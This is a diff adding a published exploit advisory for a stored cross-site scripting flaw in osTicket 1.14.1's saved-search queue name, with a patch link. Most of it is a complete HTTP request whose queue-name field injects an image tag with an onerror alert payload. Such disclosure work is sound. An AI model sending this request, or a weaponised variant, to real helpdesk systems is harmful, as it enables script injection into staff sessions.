@@ -1,0 +1,34 @@
+# Exploit Title: osTicket 1.14.1 - 'Saved Search' Persistent Cross-Site Scripting
+# Date: 2020-06-26
+# Exploit Author: Matthew Aberegg
+# Vendor Homepage: https://osticket.com 
+# Patch Link: https://github.com/osTicket/osTicket/commit/d54cca0b265128f119b6c398575175cb10cf1754
+# Version: osTicket 1.14.1 
+# Tested on: CentOS 7 (1908)
+
+
+# Vulnerability Details
+# Description :  A persistent cross-site scripting vulnerability exists within the 'Saved Searches' functionality of osTicket.  
+# Vulnerable Parameter : queue-name 
+
+
+# POC
+# Exploit Details : The following request will create a personal queue with an XSS payload as the queue name.  
+
+
+POST /os-ticket/scp/ajax.php/tickets/search/save HTTP/1.1
+Host: TARGET
+Content-Length: 2407
+Accept: */*
+X-CSRFToken: 4c0cfe1d90018bd1521d4c6236ff9e695695feb4
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://TARGET
+Referer: http://TARGET/os-ticket/scp/tickets.php?queue=1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: OSTSESSID=1bgg4patkgh75amtk7i40ijg0r
+Connection: close
+
+id=&parent_id=1&a=search&fields%5B%5D=status__id&fields%5B%5D=status__state&fields%5B%5D=dept_id&fields%5B%5D=assignee&fields%5B%5D=topic_id&fields%5B%5D=created&fields%5B%5D=est_duedate&fields%5B%5D=duedate&6e726d7c5d6739=&bb1ed81f8d0d5b%5B%5D=includes&_field-checkboxes%5B%5D=1248906005&5a14e85b6ad733%5B%5D=includes&64e882412ea044%5B%5D=open&3387e761db951b%5B%5D=includes&fae2c0ad94312b%5B%5D=assigned&8b25367208a92c%5B%5D=set&4548de579d61b2%5B%5D=set&6b0942ccd352fb=&7508c012d200c3=&306afd69a94f37=&2cb42ece11fe18=&19178654ae1019=&5446ab541e9cbe=&643b959c89a939%5B%5D=&c41f997e500bde=&594ae09ae9b23b%5B%5D=d&f67d51537548ed=&782f1a2f64f6b8%5B%5D=d&bf54f7c4c9cd85=&d53f6d5fa7c165%5B%5D=d&dda4c3a3983e11=&3edd5b8c560cb0%5B%5D=d&5d54602e649846%5B%5D=set&eee448b2f6bd17=&c66cc8358c9461=&1c2df7cbee73a8=&2b12655056e4bc=&559ec54e5d4f4d=&4d653aa4c6fbfe=&fde625f821b1cc%5B%5D=&1d3ec7f5059a1e=&fd5c9e3beeb866%5B%5D=d&f9d70eb7b32ef7=&4e236864d83b1b%5B%5D=d&6ad52c19a211f8=&17d6ed14edc097%5B%5D=d&1ed604fc8adb80=&29187a3432e23b%5B%5D=d&6a2107ce7bc3ad%5B%5D=set&968398f30ae34d=&1bd5961978d6f5=&aaead453b69fd8=&b2473437455577=&2d7ade2446d29d=&7248fe732f4071=&9d29b71605e863%5B%5D=&606b27533da5da=&042dae34bbf5f6%5B%5D=d&69e461f3457905=&9cb82bf3b3b655%5B%5D=d&472a67a44bfd63=&387c6a57919904%5B%5D=d&b13a3742f14f6a=&285dc00ac07d30%5B%5D=d&new-field=&inherit-columns=on&columns%5B1%5D%5Bcolumn_id%5D=1&columns%5B1%5D%5Bheading%5D=Ticket&columns%5B1%5D%5Bwidth%5D=100&columns%5B1%5D%5Bname%5D=Ticket+%23&columns%5B1%5D%5Bsortable%5D=on&columns%5B10%5D%5Bcolumn_id%5D=10&columns%5B10%5D%5Bheading%5D=Last+Updated&columns%5B10%5D%5Bwidth%5D=150&columns%5B10%5D%5Bname%5D=Last+Updated&columns%5B10%5D%5Bsortable%5D=on&columns%5B3%5D%5Bcolumn_id%5D=3&columns%5B3%5D%5Bheading%5D=Subject&columns%5B3%5D%5Bwidth%5D=300&columns%5B3%5D%5Bname%5D=Subject&columns%5B3%5D%5Bsortable%5D=on&columns%5B4%5D%5Bcolumn_id%5D=4&columns%5B4%5D%5Bheading%5D=From&columns%5B4%5D%5Bwidth%5D=185&columns%5B4%5D%5Bname%5D=User+Name&columns%5B4%5D%5Bsortable%5D=on&columns%5B5%5D%5Bcolumn_id%5D=5&columns%5B5%5D%5Bheading%5D=Priority&columns%5B5%5D%5Bwidth%5D=85&columns%5B5%5D%5Bname%5D=Priority&columns%5B5%5D%5Bsortable%5D=on&columns%5B8%5D%5Bcolumn_id%5D=8&columns%5B8%5D%5Bheading%5D=Assigned+To&columns%5B8%5D%5Bwidth%5D=160&columns%5B8%5D%5Bname%5D=Assignee&columns%5B8%5D%5Bsortable%5D=on&queue-name=%3Cimg+src%3D%2F+onerror%3Dalert(1)%3E
